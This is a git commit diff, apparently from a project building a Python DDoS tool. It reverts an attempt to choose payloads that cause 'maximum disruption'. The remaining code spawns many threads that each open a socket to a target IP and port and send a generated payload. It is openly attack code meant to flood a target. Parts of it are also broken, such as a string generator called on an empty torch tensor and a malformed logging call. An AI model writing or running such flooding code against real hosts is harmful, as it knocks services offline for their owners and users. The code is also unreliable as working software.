6c54542fd92172e8a75496712d4ea02a6d64dcc8
NripeshN <nn2012@hw.ac.uk>
2023-07-31 10:34:56 +0530

    revert ddos RL

--- src/ddos_attack.py
+++ src/ddos_attack.py
@@ -16,36 +16,25 @@ class DDoSAttack:
         self.target_port = target_port
         self.num_connections = num_connections
         self.threads = []
-        self.model = PayloadGenerator()  # some model that generates different types of payloads
+        self.model = RandomStringGenerator(100)
+
+    def simulate_attack(self):
+        for _ in range(self.num_connections):
+            thread = threading.Thread(target=self.create_connection)
+            self.threads.append(thread)
+            thread.start()
 
     def create_connection(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_ip, self.target_port))
-            # Generate different types of payloads and pick the one that leads to maximum disruption
-            max_disruption = -1
-            best_payload = None
-            for _ in range(10):  # try 10 different types of payloads
-                payload = self.model.generate_payload()
-                disruption = self.send_payload(sock, payload)
-                if disruption > max_disruption:
-                    max_disruption = disruption
-                    best_payload = payload
-            logging.info(f"Best payload: {best_payload}")
+            payload = self.model(torch.tensor([])).encode()  # Generate payload
+            sock.send(payload)
+            logging.info(f"Payload sent:", payload)
+            sock.send(b"QUIT")
+            sock.close()
         except Exception as e:
             logging.error(f"Exception occurred while creating a connection: {e}")
-
-    def send_payload(self, sock, payload):
-        sock.send(payload.encode())
-        # Some way to measure the disruption caused by the payload. This is a simplified example
-        # and in real life, it could involve measuring packet loss, response time, etc.
-        # Note that this function should return a numeric value indicating the level of disruption
-        disruption = self.measure_disruption()
-        return disruption
-
-    def measure_disruption(self):
-        # Dummy function, in real life this should measure the level of disruption caused by the payload
-        return random.random()
 
     def wait_for_threads(self):
         for thread in self.threads:
